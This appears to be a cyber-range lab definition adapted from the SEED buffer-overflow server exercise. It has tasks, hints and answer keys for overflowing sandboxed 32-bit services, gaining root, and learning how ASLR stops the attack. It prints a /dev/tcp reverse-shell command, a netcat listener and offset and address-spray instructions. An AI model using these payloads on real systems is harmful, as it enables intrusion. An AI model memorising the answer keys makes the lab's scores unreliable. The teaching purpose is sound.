title: Buffer Overflow Attack Lab (Server Version)
description: Hands-on buffer-overflow attack lab (SEED): exploit vulnerable network servers to obtain a root shell.
outcomes: Understand how a stack buffer overflow overwrites the return address.
Build a payload (NOP sled + shellcode + return address) and exploit a remote service.
Obtain a root reverse shell on a vulnerable server.
Explain how ASLR mitigates buffer-overflow attacks.

levels.title: Introduction
levels.content:
# Please read carefully

* This lab is for **educational purposes only**. The techniques must only be used inside this training sandbox.
* Each level builds on the previous one. Do not skip ahead.
* Revealing a solution or taking hints reduces your score.

# Scenario

You are a penetration tester. On the target network there is a server (`10.1.26.9`) exposing two network services that each wrap a program written in C. Both programs contain a classic **stack buffer-overflow** vulnerability and run as **root**. Your mission: exploit them to obtain a **root shell** and read the secret flag on each service.

You work from the **attacker** machine (`10.1.26.23`), a SEED Ubuntu box equipped with the tools you need (`gcc`, `python3`, `netcat`, `gdb`) and the lab files in `~/shellcode` and `~/attack-code`.

# Topology

| Machine | IP | Role |
|---|---|---|
| attacker | `10.1.26.23` | your box (you log in here) |
| server | `10.1.26.9` | runs the vulnerable services |

| Target | Address | Difficulty |
|---|---|---|
| Level 1 | `10.1.26.9:9090` | 32-bit, shows frame pointer **and** buffer address |
| Level 2 | `10.1.26.9:9091` | 32-bit, shows **only** the buffer address |

levels.title: Get Access
levels.cloud_content:
Connect to the **attacker** machine, then submit the answer **`start`**.

### Sandbox access
1. In the topology overview on the right, right-click on **`attacker`** and click **`Open GUI`**; a new window appears.
2. Log in with username **`user`** and password **`Password123`**.

Alternatively you can use SSH. See the [documentation](https://docs.platform.cyberrange.cz/user-guide-advanced/sandboxes/sandbox-access/#user-access) for details.
levels.local_content: This sandbox has not been tested for use with a local sandbox.

levels.title: Task 1 - Get familiar with the shellcode
levels.content:
The goal of a code-injection attack is to run **shellcode** - a small piece of machine code that launches a shell - using the privilege of the vulnerable program.

The shellcode is provided for you in `~/shellcode`. Build and test it:

```
user@attacker:~$ cd ~/shellcode
user@attacker:~/shellcode$ ./shellcode_32.py   # writes codefile_32
user@attacker:~/shellcode$ ./shellcode_64.py   # writes codefile_64
user@attacker:~/shellcode$ make                # builds a32.out and a64.out
user@attacker:~/shellcode$ ./a32.out           # runs the 32-bit shellcode
user@attacker:~/shellcode$ ./a64.out           # runs the 64-bit shellcode
```

Open `shellcode_32.py` and read how the shellcode launches `/bin/bash -c` with a command string. Try changing that command string (keep the total length identical by adjusting spaces before the `*` marker), regenerate the code file, and run it again to confirm your command executes.

**Flag:** the shellcode ends by invoking a single system call that replaces the current process image with a shell. Submit the **name of that system call**.
levels.solution: The 32-bit shellcode sets `eax = 0x0b` (11) and triggers `int 0x80`; syscall 11 on x86 is `execve`. The flag is `execve`.

hints.title: Where to look
hints.content: A shell is started by replacing the running process with a new program. The family of system calls that does this starts with `exec`.

hints.title: The exact name
hints.content: On Linux, the system call that loads and runs a new program image (used by the shellcode via `int 0x80`, eax=11) is `execve`.

levels.title: Task 2 - Level 1 attack (32-bit)
levels.content:
The first target runs on **`10.1.26.9:9090`**. It is a **32-bit** program. Send it a benign message first:

```
user@attacker:~$ echo hello | nc 10.1.26.9 9090
```

The server replies with the two values you need: the **frame pointer (ebp)** and the **buffer's address** inside `bof()`. From these you can compute where to place your return address and shellcode.

### Build the exploit
Edit `~/attack-code/exploit.py` (paste the 32-bit shellcode from Task 1, set `start`, `ret` and `offset`), then:

```
user@attacker:~/attack-code$ ./exploit.py           # creates badfile
user@attacker:~/attack-code$ cat badfile | nc 10.1.26.9 9090
```

### Get a root shell
Modify the shellcode's command string to launch a **reverse shell** back to your attacker box, and listen for it:

```
user@attacker:~$ nc -lnv 4444                       # terminal 1: listener
# reverse-shell command (runs on the target):
#   /bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1
user@attacker:~/attack-code$ cat badfile | nc 10.1.26.9 9090   # terminal 2: fire
```

When the reverse shell connects, you are **root inside the target**. Read the flag:

```
root@...:/# cat /root/flag
```

**Flag:** the contents of `/root/flag` on the Level 1 target.
levels.solution: Use the leaked ebp and buffer address: the return address slot is at `ebp+4`, so `offset = (ebp - buffer) + 4`. Set `ret` to an address inside the NOP sled (e.g. `buffer + 0x120`). Put the shellcode near the end of the 517-byte payload. Use the reverse-shell command string `/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`. After the shell connects, `cat /root/flag`.

hints.title: Finding the offset to the return address
hints.content: The saved return address sits just above the saved frame pointer: its offset in the buffer is `(ebp - buffer_address) + 4` bytes.

hints.title: Choosing the return address
hints.content: Point `ret` somewhere into the NOP sled, e.g. `buffer_address + 0x120`. Execution slides down the NOPs into your shellcode.

hints.title: Getting an interactive root shell
hints.content: Put a reverse shell in the shellcode command string: `/bin/bash -i > /dev/tcp/10.1.26.23/4444 0<&1 2>&1`, and run `nc -lnv 4444` on the attacker first.

levels.title: Task 3 - Level 2 attack (32-bit, buffer size unknown)
levels.content:
The second target runs on **`10.1.26.9:9091`**. It is still a **32-bit** program, but this time it reveals **only the buffer's address** - not the frame pointer. That means you do **not** know the buffer size.

```
user@attacker:~$ echo hello | nc 10.1.26.9 9091
```

You are told only the range:

> Buffer size is somewhere in **[100, 300]** bytes. (The saved frame pointer is always a multiple of 4.)

Construct **a single payload** that works for any buffer size in that range - do not brute-force one size at a time. The trick: **spray the return address many times** across the region where the return slot could be, and place the shellcode at the very end of the 517-byte payload.

Get a root reverse shell exactly as in Task 2 (back to `10.1.26.23`), then:

```
root@...:/# cat /root/flag
```

**Flag:** the contents of `/root/flag` on the Level 2 target.
levels.solution: Because the buffer address is known but its size is not, fill the payload from `buffer_address` upward with copies of the return address (every 4 bytes), covering the whole [100,300] window where the saved return address may be - all return-address candidates point into the NOP sled. Place the shellcode at the end of the 517-byte buffer. One payload then works for any size in range. Reverse shell back to `10.1.26.23`, then `cat /root/flag`.

hints.title: One payload for the whole range
hints.content: Write the return address repeatedly, once every 4 bytes, across the window where the return slot could be (roughly offsets 100 to 304). Every copy points into the same NOP sled.

hints.title: Where to put the shellcode
hints.content: Put the shellcode at the very end of the 517-byte payload, so it is above every possible frame and never overwritten by the address spray.

levels.title: Task 6 - Address randomization (ASLR)
levels.content:
Your attacks worked because **ASLR (Address Space Layout Randomization)** is disabled on the target. Confirm it: connect to Level 1 several times and watch the leaked buffer address.

```
user@attacker:~$ echo hello | nc 10.1.26.9 9090
user@attacker:~$ echo hello | nc 10.1.26.9 9090
user@attacker:~$ echo hello | nc 10.1.26.9 9090
```

The buffer address is **the same every time** - so the fixed return address in your payload always lands. With ASLR enabled, that address would change on each run, and a single hard-coded return address would almost always miss (on 32-bit it can still be brute-forced thanks to the small entropy; on 64-bit it becomes impractical).

ASLR is controlled by the kernel parameter `kernel.randomize_va_space`:
* `0` = off (current state)
* `1` = partial
* `2` = full randomization

**Flag:** submit the value of `kernel.randomize_va_space` that enables **full** address-space randomization.
levels.solution: `sudo sysctl -w kernel.randomize_va_space=2` enables full ASLR. The flag is `2`. With full randomization the stack base changes every execution, so a hard-coded return address no longer reliably points into the NOP sled.

hints.title: The parameter values
hints.content: `kernel.randomize_va_space` takes 0 (off), 1 (partial) or 2 (full). You want full randomization.
